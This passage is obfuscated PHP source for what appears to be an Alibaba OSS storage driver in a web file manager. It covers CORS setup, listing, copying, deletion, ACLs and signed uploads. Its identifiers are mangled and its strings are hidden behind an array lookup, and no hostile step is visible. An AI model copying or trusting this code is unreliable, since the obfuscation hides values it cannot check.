OSS\Model\CorsConfig(); $§„§û‘ = new OSS\Model\CorsRule(); $§„§û‘->addAllowedOrigin($ÍäŒÓ¥À[1471]); $§„§û‘->addAllowedMethod($ÍäŒÓ¥À[1472]); $§„§û‘->addAllowedMethod($ÍäŒÓ¥À[1473]); $§„§û‘->addAllowedMethod($ÍäŒÓ¥À[1474]); $§„§û‘->addAllowedMethod($ÍäŒÓ¥À[1475]); $§„§û‘->addAllowedMethod($ÍäŒÓ¥À[175]); $§„§û‘->setMaxAgeSeconds(600); $§„§û‘->addExposeHeader($ÍäŒÓ¥À[1476]); $§„§û‘->addAllowedHeader($ÍäŒÓ¥À[1471]); $´µàûĞ->addRule($§„§û‘); try { $this->client->putBucketCors($this->bucket, $´µàûĞ); } catch (OSS\Core\OssException $ÌŞ˜ä‰–) { $this->writeLog(__FUNCTION__ . $ÍäŒÓ¥À[224] . $ÌŞ˜ä‰–->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÜœÉÍÊş =& $_SERVER[¼èá¯æÙ]; $ÙàÜĞ” = null; try { $ÙàÜĞ” = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¨›ûŠ”) { $this->writeLog(__FUNCTION__ . $ÜœÉÍÊş[224] . $¨›ûŠ”->getMessage()); return null; } if (!$ÙàÜĞ” || !($ õã¬É¦ = $ÙàÜĞ”->getRules())) { return null; } $áÛ…ßš™ = $ õã¬É¦[0]->getAllowedOrigins(); $¥ÖªªÒ = $ õã¬É¦[0]->getAllowedMethods(); $‹ìŞŞÃÈ = $ õã¬É¦[0]->getMaxAgeSeconds(); $š°Î“å = $ õã¬É¦[0]->getExposeHeaders(); $§µÁ‡–Ñ = $ õã¬É¦[0]->getAllowedHeaders(); return array($ÜœÉÍÊş[230] => isset($áÛ…ßš™[0]) ? $áÛ…ßš™[0] : $ÜœÉÍÊş[12], $ÜœÉÍÊş[234] => $¥ÖªªÒ, $ÜœÉÍÊş[1477] => $‹ìŞŞÃÈ, $ÜœÉÍÊş[1478] => isset($š°Î“å[0]) ? $š°Î“å[0] : $ÜœÉÍÊş[12], $ÜœÉÍÊş[231] => isset($§µÁ‡–Ñ[0]) ? $§µÁ‡–Ñ[0] : $ÜœÉÍÊş[12]); } public function isBucketCors() { $ÉÈàÖÔã =& $_SERVER[¼èá¯æÙ]; $ú‰ËÑûÕ = $this->getBucketCors(); if (!$ú‰ËÑûÕ || !is_array($ú‰ËÑûÕ)) { return !1; } if ($ú‰ËÑûÕ[$ÉÈàÖÔã[230]] != $ÉÈàÖÔã[232] || $ú‰ËÑûÕ[$ÉÈàÖÔã[231]] != $ÉÈàÖÔã[232]) { return !1; } $ßÌ·şµ = array_map($ÉÈàÖÔã[233], $ú‰ËÑûÕ[$ÉÈàÖÔã[234]]); if (!is_array($ßÌ·şµ)) { $ßÌ·şµ = array(); } $¬Ä¹è—ı = array($ÉÈàÖÔã[235], $ÉÈàÖÔã[236], $ÉÈàÖÔã[237], $ÉÈàÖÔã[238], $ÉÈàÖÔã[239]); $¦Ì›˜Ò = array_diff($¬Ä¹è—ı, $ßÌ·şµ); return empty($¦Ì›˜Ò); } public function mkfile($‘‚ÍÙÖº, $¶™ÈÏ† = '', $¡€ÖİÚÁ = REPEAT_RENAME) { $öæ…‚øÅ = $this->setContent($‘‚ÍÙÖº, $¶™ÈÏ†); if ($öæ…‚øÅ !== !1) { return $this->getPathOuter($‘‚ÍÙÖº); } return !1; } public function mkdir($ßÅ•Á˜•, $åÀĞã©¹ = REPEAT_SKIP) { if ($åÀĞã©¹ && $this->_isFolder($ßÅ•Á˜•)) { return $this->getPathOuter($ßÅ•Á˜•); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ßÅ•Á˜•)); } catch (OSS\Core\OssException $ñÖ¾ Ï¨) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $ñÖ¾ Ï¨->getMessage()); return !1; } return $this->getPathOuter($ßÅ•Á˜•); } private function fileList($ş€èùÙŸ, $à‹Œ×Ÿ = '', $øàÆ¹Ä = 0) { $Ëë›Ì§ =& $_SERVER[¼èá¯æÙ]; $ş€èùÙŸ = trim($ş€èùÙŸ, $Ëë›Ì§[8]); $Áó“‹’Ç = empty($ş€èùÙŸ) && $ş€èùÙŸ !== $Ëë›Ì§[240] ? $Ëë›Ì§[12] : $ş€èùÙŸ . $Ëë›Ì§[8]; $­Õ¿Û³ = $Ëë›Ì§[12]; $ÆÈ ùÕ = 1000; $†Ãáö²¦ = $ûùÙÌßå = array(); while (!0) { check_abort(); $ô¾ø´†ú = array($Ëë›Ì§[1479] => $à‹Œ×Ÿ, $Ëë›Ì§[1480] => $Áó“‹’Ç, $Ëë›Ì§[1481] => $ÆÈ ùÕ, $Ëë›Ì§[1482] => $­Õ¿Û³); try { $„ÒŸ†ıó = $this->client->listObjects($this->bucket, $ô¾ø´†ú); } catch (OSS\Core\OssException $Ìâ˜Äè€) { $this->writeLog(__FUNCTION__ . $Ëë›Ì§[224] . $Ìâ˜Äè€->getMessage()); break; } $­Õ¿Û³ = $„ÒŸ†ıó->getNextMarker(); $¹²œ»† = $„ÒŸ†ıó->getObjectList(); $ÁìÁâ½ = $„ÒŸ†ıó->getPrefixList(); foreach ($¹²œ»† as $Éıïß) { if ($Éıïß->getKey() == $Áó“‹’Ç) { continue; } $©¿ç¾Ö = $Éıïß->getKey(); $âÊÖíÚ¸ = $Éıïß->getSize(); $û¾‰ª¢» = $Éıïß->getLastModified(); $Ç¡ãá¦ = trim($Éıïß->getETag(), $Ëë›Ì§[131]); $æÈÒ»†î = $øàÆ¹Ä ? array($Ëë›Ì§[32] => $©¿ç¾Ö, $Ëë›Ì§[89] => $âÊÖíÚ¸, $Ëë›Ì§[216] => strtotime($û¾‰ª¢»), $Ëë›Ì§[1483] => $Ç¡ãá¦) : $©¿ç¾Ö; $¬é£ûÅ = $âÊÖíÚ¸ == 0 && substr($©¿ç¾Ö, strlen($©¿ç¾Ö) - 1, 1) == $Ëë›Ì§[8] ? !0 : !1; $àŠ»÷¨Ù = array($Ëë›Ì§[89] => $âÊÖíÚ¸, $Ëë›Ì§[1484] => $âÊÖíÚ¸, $Ëë›Ì§[98] => strtotime($û¾‰ª¢»), $Ëë›Ì§[1485] => $û¾‰ª¢», $Ëë›Ì§[1483] => $Ç¡ãá¦); $this->cacheMethodInfoSet($©¿ç¾Ö, $¬é£ûÅ, $àŠ»÷¨Ù); if ($¬é£ûÅ) { $†Ãáö²¦[] = $©¿ç¾Ö; continue; } $ûùÙÌßå[] = $æÈÒ»†î; } foreach ($ÁìÁâ½ as $ÍÔá×‡Ô) { $†Ãáö²¦[] = $ÍÔá×‡Ô->getPrefix(); $this->cacheMethodInfoSet($ÍÔá×‡Ô->getPrefix(), !0); } if ($­Õ¿Û³ === $Ëë›Ì§[12]) { break; } } $this->cacheMethodInfoSet($ş€èùÙŸ, !0); return array($Ëë›Ì§[95] => $†Ãáö²¦, $Ëë›Ì§[96] => $ûùÙÌßå); } public function listObject($Û£ÊôÂÒ, $°â«±Ìç = '') { $ÛÑœšÕƒ =& $_SERVER[¼èá¯æÙ]; $Û£ÊôÂÒ = trim($Û£ÊôÂÒ, $ÛÑœšÕƒ[8]); $¶ÁØØõ = empty($Û£ÊôÂÒ) && $Û£ÊôÂÒ !== $ÛÑœšÕƒ[240] ? $ÛÑœšÕƒ[12] : $Û£ÊôÂÒ . $ÛÑœšÕƒ[8]; $ğëµÈ• = $ÛÑœšÕƒ[12]; $…çşÇ“Ş = 1000; $¶Ö¨éá‚ = $ıÔŸ Ğ¨ = array(); while (!0) { check_abort(); $Ç½Åâ­° = array($ÛÑœšÕƒ[1479] => $°â«±Ìç, $ÛÑœšÕƒ[1480] => $¶ÁØØõ, $ÛÑœšÕƒ[1481] => $…çşÇ“Ş, $ÛÑœšÕƒ[1482] => $ğëµÈ•); try { $Êö¬„òÎ = $this->client->listObjects($this->bucket, $Ç½Åâ­°); } catch (OSS\Core\OssException $¤ÈØ÷©œ) { $this->writeLog(__FUNCTION__ . $ÛÑœšÕƒ[224] . $¤ÈØ÷©œ->getMessage()); break; } $ğëµÈ• = $Êö¬„òÎ->getNextMarker(); $ËÍÃØ×‘ = $Êö¬„òÎ->getObjectList(); foreach ($ËÍÃØ×‘ as $µáÁÓâ­) { if ($µáÁÓâ­->getKey() == $¶ÁØØõ) { continue; } $©‹åïØÙ = $µáÁÓâ­->getKey(); $ÛãğìÙ = $µáÁÓâ­->getSize(); $Ïø©Ìíª = $ÛãğìÙ == 0 && substr($©‹åïØÙ, strlen($©‹åïØÙ) - 1, 1) == $ÛÑœšÕƒ[8] ? !0 : !1; if ($Ïø©Ìíª) { continue; } $ıÔŸ Ğ¨[] = $ÛãğìÙ . $ÛÑœšÕƒ[224] . $©‹åïØÙ; } if ($ğëµÈ• === $ÛÑœšÕƒ[12]) { break; } } return array($ÛÑœšÕƒ[95] => $¶Ö¨éá‚, $ÛÑœšÕƒ[96] => $ıÔŸ Ğ¨); } public function copyFile($‡İ–Èé, $´¤·îà¹) { $÷Áäİ¿ = $this->size($‡İ–Èé); if ($÷Áäİ¿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‡İ–Èé, $this->bucket, $this->pathEncode($´¤·îà¹)); } catch (OSS\Core\OssException $®ãßö‘) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $®ãßö‘->getMessage()); return !1; } return $this->getPathOuter($´¤·îà¹); } $íªşÑ€ = $this->multiCopyObject($‡İ–Èé, $´¤·îà¹, $÷Áäİ¿); return $íªşÑ€ ? $this->getPathOuter($´¤·îà¹) : !1; } private function multiCopyObject($¡ÜÇÑîÍ, $÷íî¥²ˆ, $Ï‹éùˆ) { $í¼¶¯ğã =& $_SERVER[¼èá¯æÙ]; try { $÷á½Ëşï = array(); if ($‹‚üØÓ¶ = $this->hashMd5($¡ÜÇÑîÍ)) { $÷á½Ëşï = array(OSS\OssClient::OSS_HEADERS => array($í¼¶¯ğã[1486] => $‹‚üØÓ¶)); } $ğõ¬…Òö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($÷íî¥²ˆ), $÷á½Ëşï); $ßÀøüıû = 1; $Ãšİ«¾ú = 0; $Ö³²ô· = array(); $ÕßäáÓĞ = 1024 * 1024 * 10; $Á§¢‘Á = $this->client->generateMultiuploadParts($Ï‹éùˆ, $ÕßäáÓĞ); foreach ($Á§¢‘Á as $ÆÊî => $ó¶ª¥™É) { $¥›İîõ = $Ãšİ«¾ú + (int) $ó¶ª¥™É[$í¼¶¯ğã[1487]]; $×•ÍÂüØ = (int) $ó¶ª¥™É[$í¼¶¯ğã[424]] + $¥›İîõ - 1; $Íå›æ¦ù = array($í¼¶¯ğã[177] => $¥›İîõ, $í¼¶¯ğã[178] => $×•ÍÂüØ); $Ö³²ô·[] = $this->client->uploadPartCopy($this->bucket, $¡ÜÇÑîÍ, $this->bucket, $this->pathEncode($÷íî¥²ˆ), $ßÀøüıû, $ğõ¬…Òö, $Íå›æ¦ù); $ßÀøüıû = $ßÀøüıû + 1; } $²”òã“Ü = array(); foreach ($Ö³²ô· as $ÆÊî => $É‹÷‰ˆ) { $²”òã“Ü[] = array($í¼¶¯ğã[308] => $ÆÊî + 1, $í¼¶¯ğã[309] => $É‹÷‰ˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($÷íî¥²ˆ), $ğõ¬…Òö, $²”òã“Ü); } catch (OSS\Core\OssException $›äÎ¾ƒ) { $this->writeLog(__FUNCTION__ . $í¼¶¯ğã[224] . $›äÎ¾ƒ->getMessage()); return !1; } return !0; } public function moveFile($ï£ÃºÖ, $€ÁÜ·ŠÉ) { if ($this->copyFile($ï£ÃºÖ, $€ÁÜ·ŠÉ)) { $this->remove($ï£ÃºÖ); return $this->getPathOuter($€ÁÜ·ŠÉ); } return !1; } public function delFile($¯öÂÛã) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¯öÂÛã)); } catch (OSS\Core\OssException $Œù·Ğ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $Œù·Ğ->getMessage()); return !1; } return !0; } public function delFolder($• —š³ı) { $Ô©•Ê‹· =& $_SERVER[¼èá¯æÙ]; if (!$this->exist($• —š³ı)) { return !0; } $this->listItemCache = !1; $Åïíù°á = $this->fileList($• —š³ı); $this->listItemCache = !0; $¦š¨ç´ = trim($• —š³ı, $Ô©•Ê‹·[8]) . $Ô©•Ê‹·[8]; if (!empty($• —š³ı) && $• —š³ı !== $Ô©•Ê‹·[240] && !in_array($¦š¨ç´, $Åïíù°á[$Ô©•Ê‹·[95]])) { $Åïíù°á[$Ô©•Ê‹·[95]][] = $¦š¨ç´; } $Ë£±”ƒÏ = $this->delByBatch($Åïíù°á[$Ô©•Ê‹·[96]]); if (!$Ë£±”ƒÏ) { return !1; } $Ë£±”ƒÏ = $this->delByBatch($Åïíù°á[$Ô©•Ê‹·[95]]); if (!$Ë£±”ƒÏ) { return !1; } return $this->delFile($¦š¨ç´); } private function delByBatch($ö¤’”ø÷) { foreach (array_chunk($ö¤’”ø÷, 1000) as $®ê«‚ö¾) { try { $this->client->deleteObjects($this->bucket, $®ê«‚ö¾); } catch (OSS\Core\OssException $¼ºÓªè”) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $¼ºÓªè”->getMessage()); return !1; } } return !0; } public function rename($Î™¯éÅ¦, $¦­ƒèİŸ) { return $this->renameObject($Î™¯éÅ¦, $¦­ƒèİŸ); } private function fileInfo($Ã°òŠ×ü, $¶ƒ®§•” = false, $è•Õ Å¤ = array()) { $ŠÓ£ìªğ =& $_SERVER[¼èá¯æÙ]; $ğ·Şï¨ = array($ŠÓ£ìªğ[32] => $this->pathThis($Ã°òŠ×ü), $ŠÓ£ìªğ[97] => $this->getPathOuter($Ã°òŠ×ü), $ŠÓ£ìªğ[33] => $ŠÓ£ìªğ[242], $ŠÓ£ìªğ[89] => isset($è•Õ Å¤[$ŠÓ£ìªğ[89]]) ? $è•Õ Å¤[$ŠÓ£ìªğ[89]] : 0, $ŠÓ£ìªğ[179] => $this->ext($Ã°òŠ×ü)); if ($¶ƒ®§•”) { return $ğ·Şï¨; } $ğ·Şï¨[$ŠÓ£ìªğ[243]] = $ğ·Şï¨[$ŠÓ£ìªğ[98]] = 0; $ğ·Şï¨[$ŠÓ£ìªğ[244]] = $ğ·Şï¨[$ŠÓ£ìªğ[245]] = !0; if (empty($è•Õ Å¤)) { $Ê¼«×ïµ = $this->objectMeta($Ã°òŠ×ü); if (!$Ê¼«×ïµ) { return $ğ·Şï¨; } $è•Õ Å¤ = array($ŠÓ£ìªğ[98] => strtotime($Ê¼«×ïµ[$ŠÓ£ìªğ[1485]]), $ŠÓ£ìªğ[89] => $Ê¼«×ïµ[$ŠÓ£ìªğ[1484]] + 0, $ŠÓ£ìªğ[1483] => $Ê¼«×ïµ[$ŠÓ£ìªğ[1483]]); } if (isset($è•Õ Å¤[$ŠÓ£ìªğ[1483]]) && $è•Õ Å¤[$ŠÓ£ìªğ[1483]]) { $ğ·Şï¨[$ŠÓ£ìªğ[247]] = trim($è•Õ Å¤[$ŠÓ£ìªğ[1483]], $ŠÓ£ìªğ[131]); } if (isset($è•Õ Å¤[$ŠÓ£ìªğ[89]])) { $ğ·Şï¨[$ŠÓ£ìªğ[89]] = $è•Õ Å¤[$ŠÓ£ìªğ[89]]; } if (isset($è•Õ Å¤[$ŠÓ£ìªğ[98]])) { $ğ·Şï¨[$ŠÓ£ìªğ[98]] = $è•Õ Å¤[$ŠÓ£ìªğ[98]]; } if (isset($è•Õ Å¤[$ŠÓ£ìªğ[216]]) && !trim($ğ·Şï¨[$ŠÓ£ìªğ[98]])) { $ğ·Şï¨[$ŠÓ£ìªğ[98]] = $è•Õ Å¤[$ŠÓ£ìªğ[216]]; } return $ğ·Şï¨; } private function folderInfo($óÓ¸÷±Ë, $òÈ³÷Ëş = false, $ÀÚòí­È = array()) { $ôú×»˜ü =& $_SERVER[¼èá¯æÙ]; $¥ùÚÖôí = array($ôú×»˜ü[32] => $this->pathThis($óÓ¸÷±Ë), $ôú×»˜ü[97] => $this->getPathOuter($ôú×»˜ü[8] . $óÓ¸÷±Ë), $ôú×»˜ü[33] => $ôú×»˜ü[88]); if ($òÈ³÷Ëş) { return $¥ùÚÖôí; } $¥ùÚÖôí[$ôú×»˜ü[243]] = $¥ùÚÖôí[$ôú×»˜ü[98]] = 0; $¥ùÚÖôí[$ôú×»˜ü[244]] = $¥ùÚÖôí[$ôú×»˜ü[245]] = !0; if (empty($ÀÚòí­È)) { $óÓ¸÷±Ë = rtrim($óÓ¸÷±Ë, $ôú×»˜ü[8]) . $ôú×»˜ü[8]; $ŸâÒ¡¢æ = $this->objectMeta($óÓ¸÷±Ë); if (!$ŸâÒ¡¢æ) { return $¥ùÚÖôí; } $ÀÚòí­È = array($ôú×»˜ü[243] => $ŸâÒ¡¢æ[$ôú×»˜ü[586]][$ôú×»˜ü[1488]], $ôú×»˜ü[98] => strtotime($ŸâÒ¡¢æ[$ôú×»˜ü[1485]])); } if (isset($ÀÚòí­È[$ôú×»˜ü[98]])) { $¥ùÚÖôí[$ôú×»˜ü[98]] = $ÀÚòí­È[$ôú×»˜ü[98]]; } if (isset($ÀÚòí­È[$ôú×»˜ü[243]])) { $¥ùÚÖôí[$ôú×»˜ü[243]] = $ÀÚòí­È[$ôú×»˜ü[243]]; } return $¥ùÚÖôí; } public function listPath($ÎÒ‡·û™, $‹Ôˆ¿ëÏ = false) { $ŠÔˆŒ =& $_SERVER[¼èá¯æÙ]; $üá‹¥Ã£ = $this->fileList($ÎÒ‡·û™, $ŠÔˆŒ[8], !0); foreach ($üá‹¥Ã£[$ŠÔˆŒ[95]] as $®Ö¡»È => $ñÕêËºæ) { $üá‹¥Ã£[$ŠÔˆŒ[95]][$®Ö¡»È] = $this->folderInfo($ñÕêËºæ, $‹Ôˆ¿ëÏ, $ñÕêËºæ); } foreach ($üá‹¥Ã£[$ŠÔˆŒ[96]] as $®Ö¡»È => $ñÕêËºæ) { $üá‹¥Ã£[$ŠÔˆŒ[96]][$®Ö¡»È] = $this->fileInfo($ñÕêËºæ[$ŠÔˆŒ[32]], $‹Ôˆ¿ëÏ, $ñÕêËºæ); } return $üá‹¥Ã£; } protected function infoChildren($‹Ùï·ì’, &$·ìŸÏŸã) { $ËŠé¬¡‘ =& $_SERVER[¼èá¯æÙ]; $¥ÜÈ³Ğè = $this->fileList($‹Ùï·ì’, $ËŠé¬¡‘[12], !0); $·ìŸÏŸã[$ËŠé¬¡‘[91]] += count($¥ÜÈ³Ğè[$ËŠé¬¡‘[95]]); $·ìŸÏŸã[$ËŠé¬¡‘[90]] += count($¥ÜÈ³Ğè[$ËŠé¬¡‘[96]]); foreach ($¥ÜÈ³Ğè[$ËŠé¬¡‘[96]] as $ú©€ëİÆ) { if (!$ú©€ëİÆ || !$ú©€ëİÆ[$ËŠé¬¡‘[89]]) { continue; } $·ìŸÏŸã[$ËŠé¬¡‘[89]] += $ú©€ëİÆ[$ËŠé¬¡‘[89]]; } } public function has($“Šºå‘, $…»Ã— = false, $âÎ×¶å¦ = true) { $Ã¡òÌÑ« =& $_SERVER[¼èá¯æÙ]; $“Šºå‘ = trim($“Šºå‘, $Ã¡òÌÑ«[8]); $ñ ìÅş = empty($“Šºå‘) && $“Šºå‘ !== $Ã¡òÌÑ«[240] ? $Ã¡òÌÑ«[12] : $“Šºå‘ . $Ã¡òÌÑ«[8]; $Äµâ¯ºÁ = $Ã¡òÌÑ«[12]; $’¡ô¿‹ = 500; $ùûÎø„ = $œÊĞ¼äë = 0; while (!0) { check_abort(); $Ç§£µˆÇ = array($Ã¡òÌÑ«[1479] => $Ã¡òÌÑ«[8], $Ã¡òÌÑ«[1480] => $ñ ìÅş, $Ã¡òÌÑ«[1481] => $’¡ô¿‹, $Ã¡òÌÑ«[1482] => $Äµâ¯ºÁ); try { $•ø—„Å¹ = $this->client->listObjects($this->bucket, $Ç§£µˆÇ); } catch (OSS\Core\OssException $‡¤àéª) { $this->writeLog(__FUNCTION__ . $Ã¡òÌÑ«[224] . $‡¤àéª->getMessage()); break; } $Äµâ¯ºÁ = $•ø—„Å¹->getNextMarker(); $ŞÌŸÅêĞ = $•ø—„Å¹->getObjectList(); $²™èœ¯ú = $•ø—„Å¹->getPrefixList(); if ($…»Ã—) { if (count($ŞÌŸÅêĞ) > 1 || count($ŞÌŸÅêĞ) == 1 && $ŞÌŸÅêĞ[0]->getKey() != $ñ ìÅş) { $ùûÎø„ += count($ŞÌŸÅêĞ) - 1; } if (!empty($²™èœ¯ú)) { $œÊĞ¼äë += count($²™èœ¯ú); } if ($Äµâ¯ºÁ === $Ã¡òÌÑ«[12]) { break; } continue; } if ($âÎ×¶å¦) { if (!empty($ŞÌŸÅêĞ)) { if (count($ŞÌŸÅêĞ) > 1 || $ŞÌŸÅêĞ[0]->getKey() != $ñ ìÅş) { return !0; } } } else { if (!empty($²™èœ¯ú)) { return !0; } } if ($Äµâ¯ºÁ === $Ã¡òÌÑ«[12]) { break; } } if ($…»Ã—) { return array($Ã¡òÌÑ«[251] => $ùûÎø„, $Ã¡òÌÑ«[252] => $œÊĞ¼äë); } return !1; } public function listAll($äû¼Öæ) { $ÜË¾Õå¸ =& $_SERVER[¼èá¯æÙ]; $ËÆ¡ï„‘ = $this->fileList($äû¼Öæ, $ÜË¾Õå¸[12], !0); $‹Ş†±áÃ = array_to_keyvalue($ËÆ¡ï„‘[$ÜË¾Õå¸[96]], $ÜË¾Õå¸[32]); foreach ($ËÆ¡ï„‘[$ÜË¾Õå¸[95]] as $¶–ÂçüÁ) { if (is_string($¶–ÂçüÁ)) { $‹Ş†±áÃ[$¶–ÂçüÁ] = array($ÜË¾Õå¸[89] => 0); } } return $this->listAllFiles($äû¼Öæ, $‹Ş†±áÃ); } public function canRead($ÈéğÇÌ) { $ìüã¨ö½ =& $_SERVER[¼èá¯æÙ]; $ è¤úßç = $this->pathAcl($ÈéğÇÌ); return $ è¤úßç == $ìüã¨ö½[1489] || $ è¤úßç == $ìüã¨ö½[633] ? !0 : !1; } public function canWrite($–ôœéêˆ) { $««å‰€ä = $this->pathAcl($–ôœéêˆ); return $««å‰€ä == $_SERVER[¼èá¯æÙ][633] ? !0 : !1; } public function pathAcl($¥Û¼œË) { $™ø³éÆ =& $_SERVER[¼èá¯æÙ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ªŠ‚ıÚ½ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¥Û¼œË)); } catch (OSS\Core\OssException $é’ßëïš) { $this->writeLog(__FUNCTION__ . $™ø³éÆ[224] . $é’ßëïš->getMessage()); return !1; } $—ƒ‚ßÈ = $ªŠ‚ıÚ½ == $™ø³éÆ[37] ? $this->bucketAcl : $ªŠ‚ıÚ½; if ($—ƒ‚ßÈ == $™ø³éÆ[1490]) { return $™ø³éÆ[1489]; } if ($—ƒ‚ßÈ == $™ø³éÆ[1491]) { return $™ø³éÆ[633]; } return $—ƒ‚ßÈ; } private function chmodPath($ßœÉÖ¸Ä, $»áíˆƒ… = '') { $¼©›ôÎ‚ =& $_SERVER[¼èá¯æÙ]; $õ—Ş› = empty($»áíˆƒ…) ? $¼©›ôÎ‚[1491] : $»áíˆƒ…; $Íä¦ÃÁ¸ = array($¼©›ôÎ‚[37], $¼©›ôÎ‚[241], $¼©›ôÎ‚[1490], $¼©›ôÎ‚[1491]); if (!in_array($õ—Ş›, $Íä¦ÃÁ¸)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ßœÉÖ¸Ä), $õ—Ş›); } catch (OSS\Core\OssException $üª£Âô) { $this->writeLog(__FUNCTION__ . $¼©›ôÎ‚[224] . $üª£Âô->getMessage()); return !1; } return !0; } public function getContent($ª½Ö) { return $this->fileSubstr($ª½Ö, -1); } public function setContent($¦¡„Ê„, $”îêŞÒÉ = '') { $—Ûªå¶É =& $_SERVER[¼èá¯æÙ]; try { $ïä‰‰³Æ = $this->trafficLimit($—Ûªå¶É[1492]); $å¬´ÌĞ‡ = $this->client->putObject($this->bucket, $this->pathEncode($¦¡„Ê„), $”îêŞÒÉ, $ïä‰‰³Æ); } catch (OSS\Core\OssException $ğ’É¤°) { $this->writeLog(__FUNCTION__ . $—Ûªå¶É[224] . $ğ’É¤°->getMessage()); return !1; } $ş‰Ñ¾—å = array($—Ûªå¶É[1486] => trim($å¬´ÌĞ‡[$—Ûªå¶É[1483]], $—Ûªå¶É[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¦¡„Ê„))); $this->updateObjMeta($¦¡„Ê„, $ş‰Ñ¾—å); return isset($å¬´ÌĞ‡[$—Ûªå¶É[1493]][$—Ûªå¶É[305]]) ? !0 : !1; } private function updateObjMeta($…ï Áæş, $†Ã˜²ú©) { $…ï Áæş = $this->pathEncode($…ï Áæş); try { $âäš˜³ê = array(OSS\OssClient::OSS_HEADERS => $†Ã˜²ú©); $this->client->copyObject($this->bucket, $…ï Áæş, $this->bucket, $…ï Áæş, $âäš˜³ê); } catch (OSS\Core\OssException $×ğâÉ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $×ğâÉ->getMessage()); return !1; } return !0; } public function upload($—»“×‚, $›úÍğš¼, $‰îª‹â = false, $Š™ËòÚˆ = REPEAT_REPLACE) { $”Çƒ ù˜ =& $_SERVER[¼èá¯æÙ]; $¢¼ÆØÕ¸ = trim($—»“×‚, $”Çƒ ù˜[8]); $”ó±ß¡ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($”Çƒ ù˜[1486] => @md5_file($›úÍğš¼)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—»“×‚))); $”ó±ß¡ = $this->trafficLimit($”Çƒ ù˜[1492], $”ó±ß¡); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¢¼ÆØÕ¸), $›úÍğš¼, $”ó±ß¡); } catch (OSS\Core\OssException $Ù·ãÉšö) { $this->writeLog(__FUNCTION__ . $”Çƒ ù˜[224] . $Ù·ãÉšö->getMessage()); return !1; } return $this->getPathOuter($—»“×‚); } public function getHost() { $–½Âò =& $_SERVER[¼èá¯æÙ]; $ğîÚõ— = explode($–½Âò[220], parent::getHost()); return $ğîÚõ—[0] . $–½Âò[220] . $this->bucket . $–½Âò[10] . $ğîÚõ—[1]; } public function uploadFormData($ßš¼üşß, $À“‘ÚŠª = 3600) { $ìœÔÁ­ =& $_SERVER[¼èá¯æÙ]; if (!($°· Û¶ = $this->getHost())) { return !1; } $—çè·Ú– = $À“‘ÚŠª; $ä¾ùÎ¤Ê = date($ìœÔÁ­[1494], time() + $—çè·Ú–); $‚’ßã¦ = new DateTime($ä¾ùÎ¤Ê); $Î½¸‘íŞ = $‚’ßã¦->format(DateTime::ISO8601); $Ê¡ˆ¡íŞ = strpos($Î½¸‘íŞ, $ìœÔÁ­[383]); $Î½¸‘íŞ = substr($Î½¸‘íŞ, 0, $Ê¡ˆ¡íŞ) . $ìœÔÁ­[1495]; $úÙöÖê« = 1048576000 * 5; $ıœÔåÎÑ = $this->pathFather($ßš¼üşß); $åâ¥ı‡ = array($ìœÔÁ­[274] => $Î½¸‘íŞ, $ìœÔÁ­[277] => array(array($ìœÔÁ­[1496], 0, $úÙöÖê«), array($ìœÔÁ­[279], $ìœÔÁ­[280], $ıœÔåÎÑ))); $„•˜¹Äî = base64_encode(json_encode($åâ¥ı‡)); $ü˜åÅ˜¦ = base64_encode(hash_hmac($ìœÔÁ­[1417], $„•˜¹Äî, $this->secret, !0)); $¸‡óò™“ = array($ìœÔÁ­[1497] => $this->accessKey, $ìœÔÁ­[289] => $„•˜¹Äî, $ìœÔÁ­[282] => $ìœÔÁ­[273], $ìœÔÁ­[1498] => $ü˜åÅ˜¦, $ìœÔÁ­[218] => $°· Û¶); $¸‡óò™“ = $this->trafficLimit($ìœÔÁ­[1492], $¸‡óò™“, !0); return $¸‡óò™“; } public function uploadMultiData($şä¬õÜü, $¡Öœ¤†ü = 3600) { $öÑñ’“ó =& $_SERVER[¼èá¯æÙ]; if (!($ŒÑÚ¼ğ¯ = $this->getHost())) { return !1; } $€»î¾ÙÉ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($şä¬õÜü)); return array($öÑñ’“ó[293] => $€»î¾ÙÉ, $öÑñ’“ó[218] => $ŒÑÚ¼ğ¯ . $öÑñ’“ó[8] . $this->pathEncode($şä¬õÜü), $öÑñ’“ó[294] => gmdate($öÑñ’“ó[1499]), $öÑñ’“ó[107] => $şä¬õÜü); } public function uploadMultiAuth($ó¼²“¹, $÷Ó–Ïş = array()) { if (isset($÷Ó–Ïş[$_SERVER[¼èá¯æÙ][295]])) { return $this->uploadPartAuth($ó¼²“¹, $÷Ó–Ïş); } return $this->uploadListAuth($ó¼²“¹, $÷Ó–Ïş); } private function uploadPartAuth($ú¢­ĞÌø, $¬Å¢µØ² = array()) { $”óšŸÍ =& $_SERVER[¼èá¯æÙ]; $†‹äÅÒ = $¬Å¢µØ²[$”óšŸÍ[107]]; $·Úãä°ß = $this->_getUploadAuth($†‹äÅÒ, $¬Å¢µØ²); $†ŒÆö„„ = array($”óšŸÍ[297] => $·Úãä°ß[$”óšŸÍ[297]], $”óšŸÍ[294] => $·Úãä°ß[$”óšŸÍ[294]]); if (isset($·Úãä°ß[$”óšŸÍ[1500]])) { 